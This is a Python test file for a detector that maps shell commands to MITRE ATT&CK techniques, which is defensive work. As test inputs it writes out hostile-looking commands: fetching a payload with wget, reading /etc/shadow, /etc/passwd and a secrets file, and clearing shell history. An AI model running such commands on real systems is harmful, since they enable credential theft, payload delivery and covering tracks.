from intelligence.mitre.mapper import MitreMapper


def mapped_ids(commands):
    return {
        item.technique_id: item
        for item in MitreMapper().map_commands(commands)
    }


def test_user_discovery_mapping():
    item = mapped_ids(["whoami"])["T1033"]
    assert item.technique_name == "System Owner/User Discovery"
    assert item.tactic == "Discovery"
    assert item.evidence == ["whoami"]


def test_file_discovery_mapping_and_deduplication():
    item = mapped_ids(["ls", "pwd", "ls"])["T1083"]
    assert item.technique_name == "File and Directory Discovery"
    assert item.evidence == ["ls", "pwd"]


def test_payload_transfer_mapping():
    item = mapped_ids(["wget http://example.com/payload"])["T1105"]
    assert item.technique_name == "Ingress Tool Transfer"


def test_multiple_techniques_across_commands():
    result = mapped_ids([
        "whoami",
        "ls",
        "wget http://example.com/file",
    ])
    assert set(result) == {"T1033", "T1083", "T1105"}


def test_hostname_maps_to_system_information_discovery():
    assert "T1082" in mapped_ids(["hostname"])


def test_uname_maps_to_system_information_discovery():
    assert "T1082" in mapped_ids(["uname -a"])


def test_ip_address_and_route_discovery():
    result = mapped_ids(["ip addr show", "ip route"])
    assert "T1016" in result
    assert result["T1016"].evidence == ["ip addr show", "ip route"]


def test_passwd_read_maps_to_local_account_discovery():
    assert "T1087.001" in mapped_ids(["cat /etc/passwd"])


def test_shadow_read_maps_to_credential_dumping():
    item = mapped_ids(["cat /etc/shadow"])["T1003.008"]
    assert item.tactic == "Credential Access"


def test_credentials_file_read_maps_to_credentials_in_files():
    assert "T1552.001" in mapped_ids([
        "cat /opt/company/secrets.env"
    ])


def test_history_clear_mapping():
    assert "T1070.003" in mapped_ids(["history -c"])


def test_chmod_mapping():
    assert "T1222.001" in mapped_ids(["chmod 755 script.sh"])


def test_curl_without_url_is_not_assumed_to_be_transfer():
    assert "T1105" not in mapped_ids(["curl --version"])


def test_unknown_commands_return_no_mapping():
    assert MitreMapper().map_commands(["echo hello", "exit"]) == []


def test_empty_and_invalid_entries_are_ignored():
    assert MitreMapper().map_commands(["", "  ", None]) == []
